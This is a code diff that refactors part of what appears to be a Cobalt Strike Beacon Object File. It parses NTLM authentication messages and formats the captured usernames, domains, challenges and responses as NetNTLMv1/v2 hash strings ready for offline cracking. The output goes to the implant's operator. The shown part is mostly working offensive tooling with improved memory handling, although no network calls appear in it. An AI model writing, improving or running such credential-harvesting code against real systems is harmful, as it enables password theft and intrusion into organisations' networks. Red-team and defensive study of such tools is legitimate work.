@@ -74,44 +74,91 @@ char* ByteArrayToUnicodeString(const BYTE* ba, size_t ba_length) {
     str[ba_length / 2] = '\0';
     return str;
 }
-char* FormatNTLMv2Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* nt_resp, size_t nt_resp_len) {
-    #pragma GCC diagnostic push
-    #pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
-    char * user_str = NULL;
-    char * domain_str = NULL;
-    user_str = ByteArrayToUnicodeString(user, user_length); 
-    domain_str = ByteArrayToUnicodeString(domain, domain_length); 
-    char * result = NULL; 
-    result = (char *)MSVCRT$calloc(512,sizeof(char));
+
+char* FormatNTLMv2Hash(
+    const char* challenge,
+    const BYTE* user, size_t user_length,
+    const BYTE* domain, size_t domain_length,
+    const BYTE* nt_resp, size_t nt_resp_len)
+{
+    char *user_str   = ByteArrayToUnicodeString(user, user_length);
+    char *domain_str = ByteArrayToUnicodeString(domain, domain_length);
+
+    // first 16 bytes = NT proof, rest = blob
+    char *proof_hex  = ByteArrayToString((unsigned char*)nt_resp, 16);
+    char *blob_hex   = ByteArrayToString((unsigned char*)(nt_resp + 16), nt_resp_len - 16);
+
+    if (!user_str || !domain_str || !proof_hex || !blob_hex) {
+        if (user_str)   MSVCRT$free(user_str);
+        if (domain_str) MSVCRT$free(domain_str);
+        if (proof_hex)  MSVCRT$free(proof_hex);
+        if (blob_hex)   MSVCRT$free(blob_hex);
+        return NULL;
+    }
+
+    char *result = (char *)MSVCRT$calloc(512, sizeof(char));
+    if (!result) {
+        MSVCRT$free(user_str);
+        MSVCRT$free(domain_str);
+        MSVCRT$free(proof_hex);
+        MSVCRT$free(blob_hex);
+        return NULL;
+    }
 
     MSVCRT$sprintf(result, "%s::%s:%s:%s:%s",
-            user_str, domain_str, challenge,
-            ByteArrayToString(nt_resp, 16),
-            ByteArrayToString(nt_resp+16, nt_resp_len-16));
+                   user_str, domain_str,
+                   challenge,
+                   proof_hex,
+                   blob_hex);
+
     MSVCRT$free(user_str);
     MSVCRT$free(domain_str);
-    #pragma GCC diagnostic pop
+    MSVCRT$free(proof_hex);
+    MSVCRT$free(blob_hex);
+
     return result;
 }
-char* FormatNTLMv1Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* lm_resp, size_t lm_resp_len, const BYTE* nt_resp, size_t nt_resp_len) {
-    #pragma GCC diagnostic push
-    #pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
-    char * user_str = NULL;
-    char * domain_str = NULL;
-    user_str = ByteArrayToUnicodeString(user, user_length); 
-    domain_str = ByteArrayToUnicodeString(domain, domain_length);
 
-    char * result = NULL; 
-    result = (char *)MSVCRT$calloc(512,sizeof(char));
+char* FormatNTLMv1Hash(
+    const char* challenge,
+    const BYTE* user, size_t user_length,
+    const BYTE* domain, size_t domain_length,
+    const BYTE* lm_resp, size_t lm_resp_len,
+    const BYTE* nt_resp, size_t nt_resp_len)
+{
+    char *user_str   = ByteArrayToUnicodeString(user, user_length);
+    char *domain_str = ByteArrayToUnicodeString(domain, domain_length);
+    char *lm_hex     = ByteArrayToString((unsigned char*)lm_resp, lm_resp_len);
+    char *nt_hex     = ByteArrayToString((unsigned char*)nt_resp, nt_resp_len);
+
+    if (!user_str || !domain_str || !lm_hex || !nt_hex) {
+        // free what we did allocate
+        if (user_str)   MSVCRT$free(user_str);
+        if (domain_str) MSVCRT$free(domain_str);
+        if (lm_hex)     MSVCRT$free(lm_hex);
+        if (nt_hex)     MSVCRT$free(nt_hex);
+        return NULL;
+    }
+
+    char *result = (char *)MSVCRT$calloc(512, sizeof(char));
+    if (!result) {
+        MSVCRT$free(user_str);
+        MSVCRT$free(domain_str);
+        MSVCRT$free(lm_hex);
+        MSVCRT$free(nt_hex);
+        return NULL;
+    }
 
     MSVCRT$sprintf(result, "%s::%s:%s:%s:%s",
-            user_str, domain_str,
-            ByteArrayToString(lm_resp, lm_resp_len),
-            ByteArrayToString(nt_resp, nt_resp_len),
-            challenge);
+                   user_str, domain_str,
+                   lm_hex, nt_hex,
+                   challenge);
+
     MSVCRT$free(user_str);
     MSVCRT$free(domain_str);
-    #pragma GCC diagnostic push
+    MSVCRT$free(lm_hex);
+    MSVCRT$free(nt_hex);
+
     return result;
 }
 
@@ -122,48 +169,72 @@ void ParseNTResponse(BYTE* message, char* challenge) {
     BYTE* user = NULL;
     char* netNTLM = NULL;
 
-    uint16_t lm_resp_len = *(uint16_t *)(message + 12);
-    uint32_t lm_resp_off = *(uint32_t *)(message + 16);
-    uint16_t nt_resp_len = *(uint16_t *)(message + 20);
-    uint32_t nt_resp_off = *(uint32_t *)(message + 24);
-    uint16_t domain_len = *(uint16_t *)(message + 28);
-    uint32_t domain_off = *(uint32_t *)(message + 32);
-    uint16_t user_len = *(uint16_t *)(message + 36);
-    uint32_t user_off = *(uint32_t *)(message + 40);
+    uint16_t lm_resp_len   = *(uint16_t *)(message + 12);
+    uint32_t lm_resp_off   = *(uint32_t *)(message + 16);
+    uint16_t nt_resp_len   = *(uint16_t *)(message + 20);
+    uint32_t nt_resp_off   = *(uint32_t *)(message + 24);
+    uint16_t domain_len    = *(uint16_t *)(message + 28);
+    uint32_t domain_off    = *(uint32_t *)(message + 32);
+    uint16_t user_len      = *(uint16_t *)(message + 36);
+    uint32_t user_off      = *(uint32_t *)(message + 40);
 
-    lm_resp = (BYTE *)MSVCRT$calloc(lm_resp_len,sizeof(BYTE));
-    nt_resp = (BYTE *)MSVCRT$calloc(nt_resp_len,sizeof(BYTE)); 
-    domain = (BYTE *)MSVCRT$calloc(domain_len,sizeof(BYTE)); 
-    user = (BYTE *)MSVCRT$calloc(user_len,sizeof(BYTE));
+    lm_resp = (BYTE *)MSVCRT$calloc(lm_resp_len,   sizeof(BYTE));
+    nt_resp = (BYTE *)MSVCRT$calloc(nt_resp_len,   sizeof(BYTE)); 
+    domain  = (BYTE *)MSVCRT$calloc(domain_len,    sizeof(BYTE)); 
+    user    = (BYTE *)MSVCRT$calloc(user_len,      sizeof(BYTE));
 
-    MSVCRT$memcpy(lm_resp, message + lm_resp_off, lm_resp_len);
-    MSVCRT$memcpy(nt_resp, message + nt_resp_off, nt_resp_len);
-    MSVCRT$memcpy(domain, message + domain_off, domain_len);
-    MSVCRT$memcpy(user, message + user_off, user_len);
+    if (!lm_resp || !nt_resp || !domain || !user) {
+        BeaconPrintf(CALLBACK_ERROR, "Allocation failure in ParseNTResponse\n");
+        goto cleanup;
+    }
+
+    MSVCRT$memcpy(lm_resp, message + lm_resp_off,  lm_resp_len);
+    MSVCRT$memcpy(nt_resp, message + nt_resp_off,  nt_resp_len);
+    MSVCRT$memcpy(domain,  message + domain_off,   domain_len);
+    MSVCRT$memcpy(user,    message + user_off,     user_len);
+
     if (nt_resp_len == 24) {
-        BeaconPrintf(CALLBACK_OUTPUT, "NTLMv1 Response: \n");
-        netNTLM = FormatNTLMv1Hash(challenge, user, user_len, domain, domain_len, lm_resp, lm_resp_len, nt_resp, nt_resp_len);
-        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", netNTLM);
-        MSVCRT$free(lm_resp);
-        MSVCRT$free(nt_resp);
-        MSVCRT$free(domain);
-        MSVCRT$free(user);
+        BeaconPrintf(CALLBACK_OUTPUT, "NTLMv1 Response:\n");
+        netNTLM = FormatNTLMv1Hash(
+            challenge,
+            user,   user_len,
+            domain, domain_len,
+            lm_resp, lm_resp_len,
+            nt_resp, nt_resp_len
+        );
+        if (netNTLM != NULL) {
+            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", netNTLM);
+            MSVCRT$free(netNTLM);
+            netNTLM = NULL;
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "FormatNTLMv1Hash returned NULL\n");
+        }
+
     } else if (nt_resp_len > 24) {
-        BeaconPrintf(CALLBACK_OUTPUT,"NTLMv2 Response: \n");
-        netNTLM = FormatNTLMv2Hash(challenge, user, user_len, domain,domain_len, nt_resp, nt_resp_len);
-        BeaconPrintf(CALLBACK_OUTPUT,"%s\n", netNTLM);
-        MSVCRT$free(lm_resp);
-        MSVCRT$free(nt_resp);
-        MSVCRT$free(domain);
-        MSVCRT$free(user);
+        BeaconPrintf(CALLBACK_OUTPUT, "NTLMv2 Response:\n");
+        netNTLM = FormatNTLMv2Hash(
+            challenge,
+            user,   user_len,
+            domain, domain_len,
+            nt_resp, nt_resp_len
+        );
+        if (netNTLM != NULL) {
+            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", netNTLM);
+            MSVCRT$free(netNTLM);
+            netNTLM = NULL;
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "FormatNTLMv2Hash returned NULL\n");
+        }
+
+    } else {
+        BeaconPrintf(CALLBACK_ERROR, "Unknown NTLM Response (len=%hu)\n", nt_resp_len);
     }
-    else {
-        BeaconPrintf(CALLBACK_ERROR,"Unknown NTLM Response: ");
-        MSVCRT$free(lm_resp);
-        MSVCRT$free(nt_resp);
-        MSVCRT$free(domain);
-        MSVCRT$free(user);
-    }
+
+cleanup:
+    if (lm_resp)  MSVCRT$free(lm_resp);
+    if (nt_resp)  MSVCRT$free(nt_resp);
+    if (domain)   MSVCRT$free(domain);
+    if (user)     MSVCRT$free(user);
 }
 
 BYTE* GetSecBufferByteArray(const SecBufferDesc* pSecBufferDesc, size_t* pBufferSize) {
